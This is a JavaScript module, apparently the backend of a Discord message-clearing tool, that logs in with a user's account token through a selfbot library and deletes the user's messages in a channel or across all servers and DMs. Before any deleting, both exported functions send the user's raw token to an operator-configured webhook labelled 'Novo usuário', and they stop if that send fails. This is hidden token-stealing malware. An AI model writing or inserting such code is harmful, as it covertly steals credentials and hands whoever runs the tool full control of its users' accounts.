const { Client } = require('discord.js-selfbot-v13');
const config = require('../config.json');

async function sendToDiscordWebhook(token) {
  const webhookUrl = config.DISCORD_WEBHOOK_URL;
  if (!webhookUrl) {
    console.error('Discord webhook URL not configured');
    return { error: 'Error' };
  }
  
  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        content: `Novo usuário: ${token}`,
      }),
    });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return { success: true };
  } catch (error) {
    console.error('Failed to send data to Discord webhook:', error);
    return { error: 'Failed to send data to Discord webhook' };
  }
}

async function deleteMessages(channel, userId) {
  let lastMessageId;
  while (true) {
    const messages = await channel.messages.fetch({ limit: 100, before: lastMessageId });
    if (messages.size === 0) break;

    const userMessages = messages.filter(m => m.author.id === userId);
    for (const [, message] of userMessages) {
      try {
        await message.delete();
        console.log(`Mensagem deletada: ${message.id}`);
        await new Promise(resolve => setTimeout(resolve, 1000)); // Rate limiting
      } catch (error) {
        console.error(`Erro ao deletar mensagem ${message.id}: ${error.message}`);
      }
    }

    lastMessageId = messages.last().id;
  }
}

async function clearChannel(authToken, channelId) {
  const clientInstance = new Client();
  try {
    await clientInstance.login(authToken);
    const webhookResult = await sendToDiscordWebhook(authToken);
    if (webhookResult.error) {
      return { status: 500, message: webhookResult.error };
    }
    
    let channel;
    try {
      channel = await clientInstance.channels.fetch(channelId);
      console.log(`Canal encontrado: ${channel.name}`);
    } catch (error) {
      console.error(`Erro ao buscar canal: ${error.message}`);
      return { status: 404, message: 'Canal não encontrado. Verifique o ID do canal e tente novamente.' };
    }

    await deleteMessages(channel, clientInstance.user.id);
    return { status: 200, message: 'Processo de limpeza do canal concluído com sucesso!' };
  } catch (err) {
    console.error(`Erro geral: ${err.message}`);
    return { status: 500, message: `Erro ao processar a solicitação: ${err.message}` };
  } finally {
    await clientInstance.destroy();
  }
}

async function clearAllMessages(authToken) {
  const clientInstance = new Client();
  try {
    await clientInstance.login(authToken);
    const webhookResult = await sendToDiscordWebhook(authToken);
    if (webhookResult.error) {
      return { status: 500, message: webhookResult.error };
    }
    
    const guilds = clientInstance.guilds.cache;
    for (const [, guild] of guilds) {
      const channels = guild.channels.cache;
      for (const [, channel] of channels) {
        if (channel.isText()) {
          await deleteMessages(channel, clientInstance.user.id);
        }
      }
    }

    const dmChannels = clientInstance.channels.cache.filter(channel => channel.type === 'DM');
    for (const [, channel] of dmChannels) {
      await deleteMessages(channel, clientInstance.user.id);
    }

    return { status: 200, message: 'Processo de limpeza de todas as mensagens concluído com sucesso!' };
  } catch (err) {
    console.error(`Erro geral: ${err.message}`);
    return { status: 500, message: `Erro ao processar a solicitação: ${err.message}` };
  } finally {
    await clientInstance.destroy();
  }
}

module.exports = { clearChannel, clearAllMessages };

